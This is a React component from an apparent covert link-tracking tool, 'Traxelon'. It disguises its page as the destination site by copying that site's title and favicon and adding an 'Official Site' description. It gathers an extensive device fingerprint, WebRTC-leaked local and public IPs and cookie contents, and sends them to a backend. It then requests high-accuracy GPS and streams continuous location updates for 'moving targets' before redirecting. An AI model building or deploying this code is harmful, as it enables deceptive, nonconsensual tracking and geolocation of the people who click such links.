import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) { return "traxelon_v9_" + token; }

// ── Run IMMEDIATELY before anything else ─────────────────────────────────────
function disguiseAsDestination(destinationUrl) {
  try {
    const url = new URL(destinationUrl.startsWith("http") ? destinationUrl : "https://" + destinationUrl);
    const domain = url.hostname.replace("www.", "");
    const siteName = domain.split(".")[0];
    const pretty = siteName.charAt(0).toUpperCase() + siteName.slice(1);
    document.title = pretty;
    const setFavicon = (rel, size) => {
      let el = document.querySelector(`link[rel='${rel}']`);
      if (!el) { el = document.createElement("link"); el.rel = rel; document.head.appendChild(el); }
      el.href = `https://www.google.com/s2/favicons?domain=${domain}&sz=${size}`;
    };
    setFavicon("icon", 64);
    setFavicon("shortcut icon", 64);
    setFavicon("apple-touch-icon", 128);
    let meta = document.querySelector("meta[name='description']");
    if (!meta) { meta = document.createElement("meta"); meta.name = "description"; document.head.appendChild(meta); }
    meta.content = `${pretty} - Official Site`;
  } catch { }
}

function getCanvasFingerprint() {
  try {
    const c = document.createElement("canvas"); c.width = 300; c.height = 80;
    const x = c.getContext("2d");
    x.textBaseline = "alphabetic"; x.fillStyle = "#f0f0f0"; x.fillRect(0, 0, 300, 80);
    x.fillStyle = "#069"; x.font = "bold 16px Arial"; x.fillText("Traxelon", 4, 30);
    x.fillStyle = "rgba(102,204,0,0.7)"; x.font = "italic 13px Georgia"; x.fillText("0x1F4A9", 4, 55);
    x.strokeStyle = "#f60"; x.lineWidth = 2; x.beginPath(); x.arc(150, 40, 20, 0, Math.PI * 2); x.stroke();
    const d = c.toDataURL(); let h = 0;
    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
    return h.toString(16);
  } catch { return null; }
}

function getCanvasGeometryHash() {
  try {
    const c = document.createElement("canvas"); c.width = 200; c.height = 200;
    const x = c.getContext("2d");
    x.beginPath(); x.moveTo(20, 20); x.bezierCurveTo(80, 10, 120, 150, 180, 180); x.stroke();
    x.beginPath(); x.arc(100, 100, 50, 0, Math.PI * 1.5); x.fill();
    x.font = "12px serif"; x.fillText("CanvasGeo", 50, 50);
    const d = c.toDataURL(); let h = 0;
    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
    return "geo-" + h.toString(16);
  } catch { return null; }
}

function getWebGLInfo() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl2") || c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return {};
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    const exts = gl.getSupportedExtensions() || [];
    const vhp = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
    // render hash
    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, "attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}"); gl.compileShader(vs);
    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, "precision mediump float;void main(){gl_FragColor=vec4(0.5,0.7,0.3,1.0);}"); gl.compileShader(fs);
    const prog = gl.createProgram(); gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog); gl.useProgram(prog);
    const buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,0,1]), gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(prog, "p"); gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0); gl.drawArrays(gl.TRIANGLES, 0, 3);
    const px = new Uint8Array(c.width * c.height * 4);
    gl.readPixels(0, 0, c.width, c.height, gl.RGBA, gl.UNSIGNED_BYTE, px);
    let h = 0; for (let i = 0; i < px.length; i += 4) { h = (h << 5) - h + px[i] + px[i+1] + px[i+2]; h |= 0; }
    return {
      gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
      webglVersion: gl.getParameter(gl.VERSION) || null,
      webglRenderer: gl.getParameter(gl.RENDERER) || null,
      webglVendor: gl.getParameter(gl.VENDOR) || null,
      webglShadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
      maxViewportDims: (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join("x") || null,
      maxAnisotropy: (() => { try { const e = gl.getExtension("EXT_texture_filter_anisotropic"); return e ? gl.getParameter(e.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null; } catch { return null; } })(),
      maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS) || null,
      maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS) || null,
      maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS) || null,
      aliasedPointSizeRange: (gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || []).join("-") || null,
      aliasedLineWidthRange: (gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || []).join("-") || null,
      webglExtensionsCount: exts.length,
      webglExtensionsList: exts.slice(0, 25).join(", ") || null,
      webgl2Support: !!c.getContext("webgl2"),
      webglHash: h.toString(16),
      shaderPrecision: vhp ? `hf-range:${vhp.rangeMin}/${vhp.rangeMax}-prec:${vhp.precision}` : null,
      maxCombinedTextureUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS) || null,
      maxCubeMapTextureSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE) || null,
      maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE) || null,
      maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS) || null,
      maxVertexTextureUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS) || null,
      maxFragmentTextureUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS) || null,
    };
  } catch { return {}; }
}

async function getAudioFingerprint() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return null;
    const ctx = new AC();
    const osc = ctx.createOscillator(), analyser = ctx.createAnalyser(), gain = ctx.createGain(), sp = ctx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0; osc.type = "triangle"; osc.frequency.value = 10000;
    osc.connect(analyser); analyser.connect(sp); sp.connect(gain); gain.connect(ctx.destination); osc.start(0);
    return new Promise(resolve => {
      sp.onaudioprocess = e => {
        const d = e.inputBuffer.getChannelData(0); let s = 0;
        for (let i = 0; i < d.length; i++) s += Math.abs(d[i]);
        osc.disconnect(); ctx.close(); resolve(s.toString(16).substring(0, 16));
      };
      setTimeout(() => resolve(null), 1000);
    });
  } catch { return null; }
}

function getCSSHash() {
  try {
    return [
      window.matchMedia("(prefers-color-scheme: dark)").matches,
      window.matchMedia("(prefers-reduced-motion: reduce)").matches,
      window.matchMedia("(color-gamut: p3)").matches,
      window.matchMedia("(color-gamut: srgb)").matches,
      window.matchMedia("(display-mode: standalone)").matches,
      window.matchMedia("(pointer: fine)").matches,
      window.matchMedia("(pointer: coarse)").matches,
      window.matchMedia("(hover: hover)").matches,
      window.matchMedia("(any-pointer: fine)").matches,
      window.matchMedia("(dynamic-range: high)").matches,
    ].map(b => b ? "1" : "0").join("");
  } catch { return null; }
}

function getFontInfo() {
  try {
    const fonts = [
      "Arial","Arial Black","Arial Narrow","Calibri","Cambria","Candara","Comic Sans MS",
      "Consolas","Constantia","Corbel","Courier New","Georgia","Helvetica","Helvetica Neue",
      "Impact","Lucida Console","Lucida Sans Unicode","Palatino Linotype","Roboto","Open Sans",
      "Segoe UI","Segoe UI Emoji","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana",
      "Wingdings","Century Gothic","Garamond","Gill Sans MT","MS Gothic","MS Mincho","Osaka",
      "Papyrus","Rockwell","Futura","Baskerville","Didot","Optima","Copperplate","Tw Cen MT",
      "Franklin Gothic Medium","Gabriola","Haettenschweiler","Javanese Text","Leelawadee UI",
      "Malgun Gothic","Microsoft JhengHei","Microsoft YaHei","MV Boli","Myanmar Text",
      "Nirmala UI","Segoe Print","Segoe Script","SimSun","Symbol","Webdings","Yu Gothic",
      "Book Antiqua","Bookman Old Style","Century","Perpetua","Playbill","Script MT Bold",
      "Stencil","Wide Latin","Bodoni MT","Georgia Pro","Gill Sans Nova","Neue Haas Grotesk",
    ];
    const c = document.createElement("canvas"); const x = c.getContext("2d");
    const test = "mmmmmmmmmmlli!@#$%"; const sz = "72px";
    const bw = {};
    ["monospace","sans-serif","serif"].forEach(b => { x.font = `${sz} ${b}`; bw[b] = x.measureText(test).width; });
    const detected = fonts.filter(f => ["monospace","sans-serif","serif"].some(b => { x.font = `${sz} '${f}',${b}`; return x.measureText(test).width !== bw[b]; }));
    let fp = 0; detected.forEach(f => { for (let i = 0; i < f.length; i++) { fp = (fp << 5) - fp + f.charCodeAt(i); fp |= 0; } });
    return { fontsDetected: detected.length, fontsList: detected.join(", "), fontFingerprint: "font-" + fp.toString(16) };
  } catch { return {}; }
}

async function getBattery() {
  try {
    if (!navigator.getBattery) return {};
    const b = await navigator.getBattery();
    return {
      batteryLevel: Math.round(b.level * 100),
      batteryCharging: b.charging,
      batteryChargingTime: b.chargingTime !== Infinity ? b.chargingTime : null,
      batteryDischargingTime: b.dischargingTime !== Infinity ? b.dischargingTime : null,
    };
  } catch { return {}; }
}

function getNetwork() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return {};
  let connectionQuality = null;
  if (c.effectiveType === "4g") connectionQuality = "Excellent";
  else if (c.effectiveType === "3g") connectionQuality = "Good";
  else if (c.effectiveType === "2g") connectionQuality = "Poor";
  else if (c.effectiveType === "slow-2g") connectionQuality = "Very Poor";
  return {
    connectionType: c.effectiveType || null,
    connectionQuality,
    connectionDownlink: c.downlink || null,
    connectionRtt: c.rtt || null,
    connectionSaveData: c.saveData ?? null,
    connectionDownlinkMax: c.downlinkMax || null,
  };
}

async function detectIncognito() {
  try {
    if (navigator.storage?.estimate) {
      const { quota } = await navigator.storage.estimate();
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch { return null; }
}

async function getStorage() {
  try {
    const est = await navigator.storage?.estimate();
    return {
      storageQuota: est?.quota ? Math.round(est.quota / 1024 / 1024) + " MB" : null,
      storageUsage: est?.usage ? Math.round(est.usage / 1024 / 1024) + " MB" : null,
      localStorageEnabled: (() => { try { localStorage.setItem("t","1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
      sessionStorageEnabled: (() => { try { sessionStorage.setItem("t","1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
      indexedDBEnabled: !!window.indexedDB,
      cacheAPIEnabled: String(!!window.caches),
      cookiesCount: document.cookie.split(";").filter(c => c.trim()).length,
    };
  } catch { return {}; }
}

async function getMedia() {
  try {
    if (!navigator.mediaDevices?.enumerateDevices) return {};
    const d = await navigator.mediaDevices.enumerateDevices();
    return {
      cameras: d.filter(x => x.kind === "videoinput").length,
      microphones: d.filter(x => x.kind === "audioinput").length,
      speakers: d.filter(x => x.kind === "audiooutput").length,
    };
  } catch { return {}; }
}

function getSpeech() {
  try {
    if (!window.speechSynthesis) return {};
    const v = window.speechSynthesis.getVoices();
    return { speechVoicesCount: v.length, speechVoices: v.slice(0, 10).map(x => x.name + " (" + x.lang + ")").join(", ") || null };
  } catch { return {}; }
}

function getPlugins() {
  try {
    const p = Array.from(navigator.plugins || []).map(x => x.name);
    const m = Array.from(navigator.mimeTypes || []).map(x => x.type);
    return { pluginsCount: p.length, plugins: p.slice(0, 10).join(", ") || null, mimeTypes: m.slice(0, 10).join(", ") || null };
  } catch { return {}; }
}

function getPerf() {
  try {
    const p = performance.getEntriesByType("navigation")[0];
    const mem = performance.memory;
    return {
      pageLoadTime: p ? Math.round(p.loadEventEnd - p.startTime) + " ms" : null,
      domContentLoaded: p ? Math.round(p.domContentLoadedEventEnd - p.startTime) + " ms" : null,
      dnsLookupTime: p ? Math.round(p.domainLookupEnd - p.domainLookupStart) + " ms" : null,
      tcpConnectTime: p ? Math.round(p.connectEnd - p.connectStart) + " ms" : null,
      ttfb: p ? Math.round(p.responseStart - p.requestStart) + " ms" : null,
      memoryUsed: mem ? Math.round(mem.usedJSHeapSize / 1024 / 1024) + " MB" : null,
      memoryTotal: mem ? Math.round(mem.totalJSHeapSize / 1024 / 1024) + " MB" : null,
      memoryLimit: mem ? Math.round(mem.jsHeapSizeLimit / 1024 / 1024) + " MB" : null,
    };
  } catch { return {}; }
}

async function getWebRTC() {
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    await pc.createOffer().then(o => pc.setLocalDescription(o));
    return new Promise(resolve => {
      const local = new Set(), pub = new Set();
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); resolve({ webrtcLocalIP: [...local].join(", ") || null, webrtcPublicIP: [...pub].join(", ") || null, webrtcSupport: "true" }); return; }
        const m = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/g) || [];
        m.forEach(ip => { if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) local.add(ip); else pub.add(ip); });
      };
      setTimeout(() => { pc.close(); resolve({ webrtcLocalIP: [...local].join(", ") || null, webrtcPublicIP: [...pub].join(", ") || null, webrtcSupport: "true" }); }, 1500);
    });
  } catch { return { webrtcLocalIP: null, webrtcPublicIP: null, webrtcSupport: "false" }; }
}

async function getPerms() {
  const chk = async n => { try { const r = await navigator.permissions.query({ name: n }); return r.state; } catch { return null; } };
  if (!navigator.permissions) return {};
  const r = await Promise.allSettled([
    chk("geolocation"), chk("notifications"), chk("camera"), chk("microphone"),
    chk("accelerometer"), chk("gyroscope"), chk("magnetometer"),
    chk("clipboard-read"), chk("clipboard-write"),
  ]);
  const v = x => x.status === "fulfilled" ? x.value : null;
  return {
    geolocationPermission: v(r[0]), notificationsPermission: v(r[1]),
    cameraPermission: v(r[2]), microphonePermission: v(r[3]),
    accelerometerPermission: v(r[4]), gyroscopePermission: v(r[5]),
    magnetometerPermission: v(r[6]), clipboardReadPermission: v(r[7]),
    clipboardWritePermission: v(r[8]),
  };
}

function getScreenInfo() {
  const mq = q => { try { return window.matchMedia(q).matches; } catch { return null; } };
  return {
    screenWidth: window.screen.width, screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null,
    screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null,
    pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null, windowHeight: window.innerHeight || null,
    orientation: window.screen.orientation?.type || null,
    orientationAngle: window.screen.orientation?.angle ?? null,
    outerWidth: window.outerWidth || null, outerHeight: window.outerHeight || null,
    hdrSupport: mq("(dynamic-range: high)") ? "HDR" : "SDR",
    colorGamut: mq("(color-gamut: p3)") ? "p3" : mq("(color-gamut: rec2020)") ? "rec2020" : "srgb",
    forcedColors: mq("(forced-colors: active)") ? "active" : "none",
    invertedColors: mq("(inverted-colors: inverted)") ? "inverted" : "none",
    prefersColorScheme: mq("(prefers-color-scheme: dark)") ? "dark" : "light",
    prefersReducedMotion: mq("(prefers-reduced-motion: reduce)") ? "reduce" : "no-preference",
    prefersContrast: mq("(prefers-contrast: more)") ? "more" : mq("(prefers-contrast: less)") ? "less" : "no-preference",
    displayMode: mq("(display-mode: standalone)") ? "standalone" : mq("(display-mode: fullscreen)") ? "fullscreen" : "browser",
    cssPxDensity: window.devicePixelRatio ? Math.round(window.devicePixelRatio * 96) + " dpi" : null,
    monochrome: mq("(monochrome)") ? "yes" : "no",
    pointerFine: mq("(pointer: fine)") ? "fine" : mq("(pointer: coarse)") ? "coarse" : "none",
    hoverCapability: mq("(hover: hover)") ? "hover" : "none",
  };
}

function getFeatures() {
  return {
    webSocketSupport: !!window.WebSocket,
    webWorkerSupport: !!window.Worker,
    serviceWorkerSupport: "serviceWorker" in navigator,
    webAssemblySupport: !!window.WebAssembly,
    bluetoothSupport: "bluetooth" in navigator,
    usbSupport: "usb" in navigator,
    gamepadSupport: String(!!navigator.getGamepads),
    xrSupport: String(!!navigator.xr),
    offscreenCanvasSupport: String(!!window.OffscreenCanvas),
    sharedArrayBufferSupport: String(!!window.SharedArrayBuffer),
    broadcastChannelSupport: String(!!window.BroadcastChannel),
    paymentRequestSupport: String(!!window.PaymentRequest),
    credentialMgmtSupport: String(!!(navigator.credentials?.get)),
    presentationSupport: String(!!navigator.presentation),
    notificationSupport: String(!!window.Notification),
    notificationPermission: window.Notification?.permission || null,
    vibrationSupport: String(!!navigator.vibrate),
    wakeLockSupport: String(!!(navigator.wakeLock)),
    nfcSupport: String(!!navigator.nfc),
    serialSupport: String(!!navigator.serial),
    hidSupport: String(!!navigator.hid),
    eyeDropperSupport: String(!!window.EyeDropper),
    fileSystemAccessSupport: String(!!(window.showOpenFilePicker)),
    contactPickerSupport: String(!!(navigator.contacts)),
    webShareSupport: String(!!(navigator.share)),
    clipboardAPISupport: String(!!(navigator.clipboard)),
    mediaSessionSupport: String(!!(navigator.mediaSession)),
    pictureInPictureSupport: String(!!(document.pictureInPictureEnabled)),
    pointerLockSupport: String(!!(document.pointerLockElement !== undefined)),
    fullscreenSupport: String(!!(document.fullscreenEnabled)),
    speechRecognitionSupport: String(!!(window.SpeechRecognition || window.webkitSpeechRecognition)),
    speechSynthesisSupport: String(!!window.speechSynthesis),
    cryptoSupport: String(!!(window.crypto?.subtle)),
    performanceObserverSupport: String(!!window.PerformanceObserver),
    intersectionObserverSupport: String(!!window.IntersectionObserver),
    resizeObserverSupport: String(!!window.ResizeObserver),
    mutationObserverSupport: String(!!window.MutationObserver),
    requestIdleCallbackSupport: String(!!window.requestIdleCallback),
    requestAnimFrameSupport: String(!!window.requestAnimationFrame),
    indexedDBSupport: String(!!window.indexedDB),
    fetchSupport: String(!!window.fetch),
    abortControllerSupport: String(!!window.AbortController),
    structuredCloneSupport: String(!!window.structuredClone),
    compressionStreamSupport: String(!!(window.CompressionStream)),
    queueMicrotaskSupport: String(!!window.queueMicrotask),
  };
}

function getExtraDeviceInfo() {
  try {
    const ua = navigator.userAgent;
    let deviceBrand = null;
    if (/Samsung/i.test(ua)) deviceBrand = "Samsung";
    else if (/iPhone|iPad/i.test(ua)) deviceBrand = "Apple";
    else if (/Xiaomi|MIUI/i.test(ua)) deviceBrand = "Xiaomi";
    else if (/Huawei/i.test(ua)) deviceBrand = "Huawei";
    else if (/OnePlus/i.test(ua)) deviceBrand = "OnePlus";
    else if (/OPPO/i.test(ua)) deviceBrand = "OPPO";
    else if (/vivo/i.test(ua)) deviceBrand = "Vivo";
    else if (/Realme/i.test(ua)) deviceBrand = "Realme";
    else if (/Pixel/i.test(ua)) deviceBrand = "Google";
    else if (/Motorola|moto/i.test(ua)) deviceBrand = "Motorola";
    else if (/Nokia/i.test(ua)) deviceBrand = "Nokia";
    else if (/LG/i.test(ua)) deviceBrand = "LG";
    else if (/Sony/i.test(ua)) deviceBrand = "Sony";
    else if (/HTC/i.test(ua)) deviceBrand = "HTC";

    let deviceModel = null;
    const modelMatch = ua.match(/\(([^)]+)\)/);
    if (modelMatch) deviceModel = modelMatch[1].split(";").map(s => s.trim()).join(" | ");

    const now = new Date();
    let memoryTier = null;
    const mem = navigator.deviceMemory;
    if (mem) memoryTier = mem <= 1 ? "Low-end (<= 1GB)" : mem <= 4 ? "Mid-range (2-4GB)" : "High-end (>= 8GB)";

    let keyboardLayout = null;
    try { keyboardLayout = navigator.keyboard?.getLayoutMap ? "supported" : null; } catch {}

    return {
      deviceBrand,
      deviceModel,
      cpuClass: navigator.cpuClass || null,
      oscpu: navigator.oscpu || null,
      onlineStatus: navigator.onLine ? "Online" : "Offline",
      tabHidden: String(document.hidden),
      visibilityState: document.visibilityState,
      scrollPositionX: window.scrollX || 0,
      scrollPositionY: window.scrollY || 0,
      keyboardLayout,
      memoryTier,
      dayOfWeek: now.toLocaleDateString("en-US", { weekday: "long" }),
      timeOfDay: now.getHours() < 12 ? "Morning" : now.getHours() < 17 ? "Afternoon" : now.getHours() < 20 ? "Evening" : "Night",
      documentCharset: document.characterSet || null,
      documentCompatMode: document.compatMode || null,
      documentReadyState: document.readyState || null,
      cookieString: document.cookie.substring(0, 200) || null,
      navigationCount: window.history.length || null,
      windowName: window.name || null,
      screenColorDepth: window.screen.colorDepth + "-bit" || null,
      devicePixelRatioPercent: window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) + "%" : null,
      browserCodeName: navigator.appCodeName || null,
      browserOnline: String(navigator.onLine),
      maxTouchPointsDetail: navigator.maxTouchPoints > 0 ? navigator.maxTouchPoints + " touch points" : "No touch",
      webdriver: String(!!navigator.webdriver),
      automationDetected: String(!!(navigator.webdriver || window.__selenium_unwrapped || window._phantom || window.callPhantom)),
      pageTitle: document.title || null,
      pageUrl: window.location.href || null,
      isTouchDevice: String("ontouchstart" in window || navigator.maxTouchPoints > 0),
      isSecureContext: String(!!window.isSecureContext),
      crossOriginIsolated: String(!!window.crossOriginIsolated),
      hasFocus: String(document.hasFocus()),
      visualViewportWidth: window.visualViewport ? Math.round(window.visualViewport.width) : null,
      visualViewportHeight: window.visualViewport ? Math.round(window.visualViewport.height) : null,
      visualViewportScale: window.visualViewport ? window.visualViewport.scale : null,
      colorSchemePreference: window.matchMedia?.("(prefers-color-scheme: dark)").matches ? "dark" : "light",
      htmlFontSize: window.getComputedStyle ? window.getComputedStyle(document.documentElement).fontSize || null : null,
      bodyScrollHeight: document.body ? String(document.body.scrollHeight) : null,
      bodyOffsetWidth: document.body ? String(document.body.offsetWidth) : null,
      gamepadsConnected: navigator.getGamepads ? String(Array.from(navigator.getGamepads()).filter(Boolean).length) : "0",
      captureTimestamp: new Date().toISOString(),
    };
  } catch { return {}; }
}

async function collectAll() {
  const now = new Date();
  const jan = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
  const jul = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
  const ua = navigator.userAgent;
  let browserVersion = null;
  try {
    const m = ua.match(/Edg\/([0-9.]+)/) || ua.match(/Chrome\/([0-9.]+)/) || ua.match(/Firefox\/([0-9.]+)/) || ua.match(/Version\/([0-9.]+).*Safari/);
    browserVersion = m?.[1] || null;
  } catch {}
  let architecture = null;
  try {
    if (ua.includes("WOW64") || ua.includes("Win64") || ua.includes("x64")) architecture = "x64";
    else if (/arm64/i.test(ua)) architecture = "ARM64";
    else if (/arm/i.test(ua)) architecture = "ARM";
    else if (/i686|i386/i.test(ua)) architecture = "x86";
  } catch {}

  const [battery, incognito, media, storage, audio, webrtc, perms] = await Promise.all([
    getBattery(), detectIncognito(), getMedia(), getStorage(),
    getAudioFingerprint(), getWebRTC(), getPerms(),
  ]);

  return {
    appName: navigator.appName || null,
    appVersion: navigator.appVersion?.substring(0, 80) || null,
    product: navigator.product || null,
    buildID: navigator.buildID || null,
    vendor: navigator.vendor || null,
    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
    pdfViewerEnabled: navigator.pdfViewerEnabled || null,
    cookiesEnabled: navigator.cookieEnabled || null,
    doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null,
    referrer: document.referrer || null,
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null,
    userAgent: ua,
    browserVersion,
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints || null,
    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    pointerType: window.PointerEvent ? "pointer" : "mouse",
    architecture,
    ...getWebGLInfo(),
    ...getScreenInfo(),
    ...battery,
    ...getNetwork(),
    localTime: now.toLocaleString("en-IN", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone }),
    clientTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: now.getTimezoneOffset(),
    dstActive: Math.min(jan, jul) !== now.getTimezoneOffset() ? "Yes" : "No",
    incognito: incognito ?? null,
    adBlockDetected: (() => {
      try {
        const el = document.createElement("div");
        el.className = "adsbox ad-unit ads advertisement";
        el.style.cssText = "position:absolute;left:-9999px";
        document.body.appendChild(el);
        const b = el.offsetHeight === 0 || el.offsetWidth === 0;
        document.body.removeChild(el);
        return b;
      } catch { return null; }
    })(),
    canvasHash: getCanvasFingerprint(),
    canvasGeometryHash: getCanvasGeometryHash(),
    audioFingerprint: audio,
    cssHash: getCSSHash(),
    ...media,
    ...storage,
    ...getFontInfo(),
    ...getSpeech(),
    ...getPlugins(),
    ...getPerf(),
    ...webrtc,
    ...perms,
    ...getFeatures(),
    ...getExtraDeviceInfo(),
  };
}

function requestGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(null); return; }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        gpsLat: pos.coords.latitude,
        gpsLon: pos.coords.longitude,
        gpsAccuracy: Math.round(pos.coords.accuracy),
        gpsAltitude: pos.coords.altitude || null,
        gpsSpeed: pos.coords.speed || null,
        gpsHeading: pos.coords.heading ? Math.round(pos.coords.heading) + "°" : null,
      }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  });
}

export default function TrackingCapture() {
  const { token } = useParams();
  const hasSent = useRef(false);
  const watchIdRef = useRef(null);
  const destinationUrlRef = useRef(null);

  useEffect(() => {
    if (hasSent.current) return;
    if (sessionStorage.getItem(getCaptureKey(token))) return;
    hasSent.current = true;
    sessionStorage.setItem(getCaptureKey(token), "1");
    startCapture();
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation?.clearWatch(watchIdRef.current);
    };
  }, []);

  async function startCapture() {
    try {
      const deviceInfo = await collectAll();

      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, ...deviceInfo }),
      });
      const data = await res.json();

      // ── Disguise immediately on response ─────────────────────────────────
      if (data.destinationUrl) {
        destinationUrlRef.current = data.destinationUrl;
        disguiseAsDestination(data.destinationUrl);
      }

      // ── Initial GPS fix ───────────────────────────────────────────────────
      const gpsData = await requestGPS();
      if (gpsData) {
        await fetch(BACKEND_URL + "/api/links/capture-gps", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token, ...gpsData }),
        }).catch(() => {});

        // ── Continuous watch for moving targets ───────────────────────────
        if (navigator.geolocation) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              const update = {
                gpsLat: pos.coords.latitude,
                gpsLon: pos.coords.longitude,
                gpsAccuracy: Math.round(pos.coords.accuracy),
                gpsAltitude: pos.coords.altitude || null,
                gpsSpeed: pos.coords.speed || null,
                gpsHeading: pos.coords.heading ? Math.round(pos.coords.heading) + "°" : null,
              };
              fetch(BACKEND_URL + "/api/links/capture-gps", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ token, ...update }),
              }).catch(() => {});
            },
            () => {},
            { enableHighAccuracy: true, maximumAge: 5000, timeout: 30000 }
          );
        }
      }

      // ── Redirect after 8s ─────────────────────────────────────────────────
      if (data.destinationUrl) {
        setTimeout(() => {
          if (watchIdRef.current !== null) navigator.geolocation?.clearWatch(watchIdRef.current);
          window.location.replace(data.destinationUrl);
        }, 8000);
      }

    } catch (err) {
      console.error("[TrackingCapture]", err);
    }
  }

  return <div style={{ margin: 0, padding: 0, background: "#fff", minHeight: "100vh" }} />;
}